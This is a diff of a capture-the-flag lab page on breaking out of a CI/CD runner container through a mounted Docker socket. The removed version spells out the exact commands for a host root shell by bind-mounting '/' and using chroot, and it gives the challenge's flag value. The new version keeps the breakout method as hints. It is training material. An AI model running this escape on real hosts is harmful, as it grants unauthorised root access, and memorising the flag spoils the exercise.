@@ -1,131 +1,60 @@
-# Challenge 2: Container Breakout via Docker Unix Socket
+# Challenge 2: Docker Daemon Socket Breakout & Host Escape
 
-## 📖 Background & Threat Landscape
+## Architectural Audit: UNIX Domain Socket Permissions
 
-In CI/CD environments, build workflows frequently require building and publishing new container images. To facilitate this without running complex nested virtualization, teams often implement **Docker-outside-of-Docker (DooD)** by mounting the host's Docker socket into the runner container:
+A frequent configuration anti-pattern in containerized CI/CD build environments is known as **Docker-outside-of-Docker (DooD)**. To allow build steps to assemble and push container images, system administrators frequently mount the host Docker engine's IPC channel into the runner container:
 
-```yaml
-volumes:
-  - /var/run/docker.sock:/var/run/docker.sock
+```text
+/var/run/docker.sock (Host) -> /var/run/docker.sock (Container)
 ```
 
-### The Architectural Flaw
+### Privilege Boundary Collapse
 
-The Docker daemon (`dockerd`) runs as the host's **root** user. Any entity with write access to `/var/run/docker.sock` can send raw REST API requests to the daemon, instructing it to:
-1. Pull arbitrary images.
-2. Spin up containers in **privileged mode** (`--privileged`).
-3. Bind-mount the **host's root filesystem (`/`)** into a container.
-4. Execute kernel modifications or access host host secrets.
+The Docker daemon (`dockerd`) executes with host root privileges (`UID 0`). The UNIX domain socket `/var/run/docker.sock` exposes the Docker Engine REST API without granular authorization or role-based access control by default.
 
-Consequently: **Mounting `/var/run/docker.sock` completely eliminates the container isolation boundary and confers root-equivalent access over the host machine (MITRE ATT&CK [T1611](https://attack.mitre.org/techniques/T1611/)).**
+When an unprivileged or containerized process is granted write access to this socket:
+1. The process can interact directly with the host daemon via the Docker CLI or raw HTTP requests over the UNIX socket.
+2. The daemon executes API requests within the host kernel context, not within the requesting container's restricted context.
+3. Consequently, write access to `/var/run/docker.sock` is functionally equivalent to unrestricted, passwordless `sudo` on the underlying host system (MITRE ATT&CK [T1611](https://attack.mitre.org/techniques/T1611/)).
 
 ---
 
-## 🛠️ Step-by-Step Instructions
+## Technical Objectives
 
-### 1. Access the Container and Detect the Socket
-
-Connect to `cicd_runner_pipeline` from your host terminal:
-
-```bash
-docker exec -it cicd_runner_pipeline sh
-```
-
-Verify that the Docker daemon socket is mounted inside the container:
-
-```bash
-ls -la /var/run/docker.sock
-```
-
-Notice the file permissions and ownership (`srw-rw---- root root`).
-
-### 2. Query the Host Docker Daemon from Inside the Container
-
-Run the `docker` client utility installed in the runner to communicate with the host daemon:
-
-```bash
-docker ps
-```
-
-Notice that you see the running containers on the **host machine**, including `cicd_runner_pipeline` itself!
-
-### 3. Launch an Escape Container Mounting the Host Root Filesystem
-
-Because you can control the host Docker daemon, launch a lightweight container (`alpine`) that mounts the host's entire root directory (`/`) into `/mnt/host`:
-
-```bash
-docker run -v /:/mnt/host --rm -it alpine chroot /mnt/host sh
-```
-
-Let's break down this command:
-- `docker run`: Instructs the host Docker daemon to create a new container.
-- `-v /:/mnt/host`: Mounts the host's physical root filesystem (`/`) to `/mnt/host` inside the new container.
-- `--rm`: Automatically cleans up the container upon exit.
-- `chroot /mnt/host sh`: Executes the `chroot` system call, redefining `/` to `/mnt/host` and providing an interactive root shell on the host filesystem!
-
-### 4. Retrieve the Host Root Flag
-
-You are now operating inside the host filesystem with root authority. Verify your environment:
-
-```bash
-whoami
-hostname
-```
-
-Read the host root flag located at `/root/host_flag.txt`:
-
-```bash
-cat /root/host_flag.txt
-```
-
-You should see:
-`FLAG{host_takeover_via_docker_socket_alan_turing_2026}`
-
-### 5. Exit the Breakout Shell and Record the Flag
-
-Exit the `chroot` breakout session:
-
-```bash
-exit
-```
-
-Exit the `cicd_runner_pipeline` container session to return to the host terminal:
-
-```bash
-exit
-```
-
-Save the captured flag into `/tmp/flag2.txt` on the host:
-
-```bash
-echo "FLAG{host_takeover_via_docker_socket_alan_turing_2026}" > /tmp/flag2.txt
-```
-
-Confirm that the flag is saved:
-
-```bash
-cat /tmp/flag2.txt
-```
+1. From within `cicd_runner_pipeline`, confirm the presence, filesystem permissions, and responsiveness of the exposed Docker socket.
+2. Leverage the local Docker client to orchestrate a breakout container on the host daemon.
+3. Establish access to the host's root filesystem.
+4. Locate the host security flag located at `/root/host_flag.txt`.
+5. Extract and persist the flag value to `/tmp/flag2.txt` on the host machine.
 
 ---
 
-## 🔍 DevSecOps Key Takeaway
+## Investigation Vectors and Execution Guidelines
 
-> **Why did this happen?**
-> The Docker daemon socket provides uncontrolled root access to the host kernel. Anyone who can interact with the socket can schedule containers that mount host devices and filesystems.
->
-> **Production Remediation:**
-> - **Never mount `/var/run/docker.sock` in untrusted or multi-tenant containers.**
-> - Use daemonless, rootless container builders designed for unprivileged CI/CD pipelines:
->   - [Google Kaniko](https://github.com/GoogleContainerTools/kaniko): Builds container images from a Dockerfile inside a container or Kubernetes cluster without a Docker daemon.
->   - [Podman / Buildah](https://buildah.io/): Native unprivileged image building using user namespaces.
->   - [Sysbox](https://github.com/nestybox/sysbox): A container runtime (runc replacement) that enables true Docker-in-Docker isolation without security compromises.
+### Socket Verification
+Audit the `/var/run/` directory inside `cicd_runner_pipeline`. Inspect the inode type of `docker.sock` (`srw-rw----`) and confirm whether your current container context possesses read and write permissions against it. Use the container's installed `docker` binary to query host daemon state (such as enumerating sibling containers).
+
+### Breakout Mechanics
+To traverse from the container execution context to the host filesystem, construct a deployment request directed at the host daemon:
+- **Image Selection**: Use a standard minimal utility image present on the host (such as `alpine`).
+- **Filesystem Mapping**: Utilize the volume mount flag (`-v` or `--mount`) to bind-mount the host's absolute root directory (`/`) into an arbitrary path inside the newly requested container (e.g., `/mnt/host` or `/host`).
+- **Context Transition**: Consider how you will interact with the mounted host filesystem. You may directly reference mounted files, or execute a context switch into the mounted root directory using `chroot(2)` / `chroot(8)` to establish an interactive root shell within the host's operating system environment.
+
+### Flag Retrieval
+Identify and read the sensitive administrative flag file on the host filesystem: `/root/host_flag.txt`.
 
 ---
 
-## ✅ Verification
+## Verification Requirements
 
-Click the **Check** button below or run the verification script directly from your terminal:
+Store the recovered flag string in `/tmp/flag2.txt` on the host:
+
+```text
+Target File: /tmp/flag2.txt
+Expected Format: FLAG{...}
+```
+
+Validate the challenge using the Killercoda interface or by executing:
 
 ```bash
 /step2/verify.sh
